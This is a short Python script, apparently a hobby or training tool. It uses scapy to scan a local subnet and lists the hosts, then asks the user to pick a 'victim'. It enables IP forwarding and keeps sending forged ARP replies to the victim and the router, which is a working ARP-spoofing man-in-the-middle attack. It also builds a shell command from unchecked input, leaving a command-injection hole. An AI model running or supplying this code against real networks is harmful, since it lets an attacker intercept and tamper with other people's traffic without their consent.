from scapy.all import ARP, Ether, srp
import os
import subprocess
import time

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 

print("Please enter your network ip and subnet, by following this example: ")
print("192.168.1.0/24")
net = input()

result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net)), timeout=3, verbose=0)[0]

print("Online IPs:")
ip=[]
mac=[]
for sent, received in result:
    ip.append(received.psrc)
    mac.append(received.hwsrc)

for i in range (len(ip)):
    print(i+1, ". ", ip[i], " = ", mac[i])

print("Chose a victim from the list:")
victim = int(input())-1
print("Input router ip: ")
routerip = input()
getVersion =  subprocess.Popen(("arp -a | grep " + (routerip)), shell=True, stdout=subprocess.PIPE).stdout
version =  getVersion.read()
routermac = (version.decode()).split()[3]

print ("Victim ip: ", ip[victim],"    Victim mac: ", mac[victim])

print ("Router ip: ", routerip,"    Router mac: ", routermac)

file1 = open('id.txt', 'w')
file1.write(ip[victim])
file1.close()

try:
    while True:
        torouter = srp((Ether(dst=routermac)/ARP(op = 2,pdst=routerip, psrc=ip[victim])), timeout=3, verbose=0)
        tovictim = srp((Ether(dst=mac[victim])/ARP(op = 2,pdst=ip[victim], psrc=routerip)), timeout=3, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    pass

    
    




    
    

    
    